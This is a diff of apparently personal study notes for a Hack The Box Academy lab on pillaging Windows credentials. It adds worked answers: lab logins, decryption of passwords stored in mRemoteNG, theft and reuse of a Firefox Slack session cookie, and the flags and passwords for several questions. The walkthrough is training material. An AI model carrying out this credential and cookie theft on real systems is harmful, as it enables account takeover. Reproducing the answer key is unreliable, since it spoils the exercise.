@@ -117,7 +117,7 @@ admins
 PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
 ```
 
-We can copy the file to our machine and use the Python script cookieextractor.py to extract cookies from the Firefox cookies.SQLite database.
+We can copy the file to our machine and use the Python script [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract cookies from the Firefox cookies.SQLite database.
 
 ### Extract Slack Cookie from Firefox Cookies Database
 
@@ -304,10 +304,84 @@ restoring <Snapshot 9971e881 of [C:\SampleFolder] at 2022-08-09 14:18:59.4715994
 ```
 
 ## Questions
-
+RDP to 10.129.203.122 (ACADEMY-WINLPEPILLAGE-WIN01), with user `Peter` and password `Bambi123`
 1. Access the target machine using Peter's credentials and check which applications are installed. What's the application installed used to manage and connect to remote systems? **Answer:**
-2. Find the configuration file for the application you identify and attempt to obtain the credentials for the user Grace. What is the password for the local account, Grace? **Answer:**
-3. Log in as Grace and find the cookies for the slacktestapp.com website. Use the cookie to log in into slacktestapp.com from a browser within the RDP session and submit the flag. **Answer:**
-4. Log in as Jeff via RDP and find the password for the restic backups. Submit the password as the answer. **Answer:**
+   - Check for installed applications:
+        ```powershell
+        PS C:\Users\Peter> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
+        PS C:\Users\Peter> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
+        PS C:\Users\Peter> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
+
+        DisplayName                                                        DisplayVersion  InstallLocation
+        -----------                                                        --------------  ---------------
+        DB Browser for SQLite                                              3.12.2          C:\Program Files\DB Browser for S...
+        Google Chrome                                                      105.0.5195.127  C:\Program Files\Google\Chrome\Ap...
+        Microsoft Edge                                                     105.0.1343.42   C:\Program Files (x86)\Microsoft\...
+        Microsoft Edge Update                                              1.3.167.21
+        Microsoft Edge WebView2 Runtime                                    105.0.1343.42   C:\Program Files (x86)\Microsoft\...
+        Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29325 14.28.29325.2
+        Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.24.28127 14.24.28127.4
+        Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29325     14.28.29325
+        Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29325        14.28.29325
+        Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127     14.24.28127
+        Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127        14.24.28127
+        Mozilla Firefox (x64 en-US)                                        105.0.1         C:\Program Files\Mozilla Firefox
+        Mozilla Maintenance Service                                        103.0.2
+        mRemoteNG                                                          1.76.20.24615   C:\Program Files (x86)\mRemoteNG\
+        Slack (Machine - MSI)                                              4.27.154.0
+        Slack (Machine)                                                    4.27.154
+        Update for Windows 10 for x64-based Systems (KB4023057)            2.67.0.0
+        Update for Windows 10 for x64-based Systems (KB4480730)            2.55.0.0
+        VMware Tools                                                       11.1.1.16303738 C:\Program Files\VMware\VMware To...
+        XAMPP                                                              8.1.6-0         C:\xampp
+        ```
+2. Find the configuration file for the application you identify and attempt to obtain the credentials for the user Grace. What is the password for the local account, Grace? **Answer: Princess01!**
+   - Download the [mRemoteNG-Decrypt script](https://github.com/haseebT/mRemoteNG-Decrypt) locally on attack host
+   - Start a RDP session with the Downloads folder as shared drive:
+        ```shellsession
+        $ xfreerdp /v:10.129.203.122 /u:Peter /p:Bambi123 /drive:share,/home/htb-ac-1863259/Downloads
+        ```
+   - Copy the C:\Users\Peter\AppData\Roaming\mRemoteNG\confCons.xml to our shared drive for local decryption:
+        ```powershell
+        PS C:\Users\Peter\AppData\Roaming\mRemoteNG> Copy-Item -Path .\confCons.xml -Destination "\\tsclient\share"
+        ```
+   - Decrypt the password:
+        ```shellsession
+        $ python poc.py -s "s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ="
+        Password: Princess01!
+        ```
+3. Log in as Grace and find the cookies for the slacktestapp.com website. Use the cookie to log in into slacktestapp.com from a browser within the RDP session and submit the flag. **Answer: HTB{Stealing_Cookies_To_AccessWebSites}**\
+   - Login as Grace:
+        ```shellsession
+        $ xfreerdp /v:10.129.203.122 /u:Grace /p:Princess01! /drive:share,/home/htb-ac-1863259/Downloads
+        ```
+   - Copy cookie database to our shared drive:
+        ```powershell
+        PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite \\tsclient\share
+        ```
+   - Extract slack's cookie:
+        ```shellsession
+        $ python cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d
+        (10, '', 'd', 'xoxd-VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg==', '.api.slacktestapp.com', '/', 7975292868, 1663945037085000, 1663945037085002, 0, 0, 0, 1, 0, 2)
+        ```
+   - Use that cookie to login and read the flag:
+        ```
+        Slacky Demo Chat Website 
+        You have successfully logged in  
+        FLAG: HTB{Stealing_Cookies_To_AccessWebSites} 
+        Chat  
+        jeff: Hi Grace, I'm testing the our internal Slack Demo Chat App  
+        grace: Yeah, it's working fine, we just need to add some color.  
+        jeff: Can you help me with that?  
+        grace: Sure. Where's the source code?  
+        jeff: It's in my computer, you can login with my creds Username: jeff and Password Webmaster001!  
+        grace: Ok! I'll do it :)
+        ```
+4. Log in as Jeff via RDP and find the password for the restic backups. Submit the password as the answer. **Answer: Superbackup!**
+   - Login as Jeff:
+        ```shellsession
+        $ xfreerdp /v:10.129.203.122 /u:Jeff /p:Webmaster001! /drive:share,/home/htb-ac-1863259/Downloads
+        ```
+   - Password is stored in `%USERPROFILE%\Desktop\backup.conf`
 5. Restore the directory containing the files needed to obtain the password hashes for local users. Submit the Administrator hash as the answer. **Answer:**
 6. Optional. Use the hash with a Pass-The-Hash technique to log in as the Administrator. Mark DONE when complete. **Answer:**
